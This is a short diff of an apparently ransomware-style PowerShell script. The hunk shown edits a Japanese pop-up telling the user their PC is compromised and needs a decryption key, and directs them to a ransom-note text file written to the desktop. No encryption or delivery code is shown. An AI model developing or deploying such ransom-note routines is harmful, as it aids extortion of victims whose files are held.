@@ -39,4 +39,4 @@ Set-Content -Path "$desktop\README_復元したくない人は読まないでく
 
 # メッセージ表示
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show("あなたのPCは侵害されました！\n復号キーが必要です。", "警告", 0, 'Warning')
+[System.Windows.MessageBox]::Show("あなたのPCは侵害されました！復号キーが必要です。元に戻したい場合はDesktopのテキストファイルを確認してください。", "警告", 0, 'Warning')
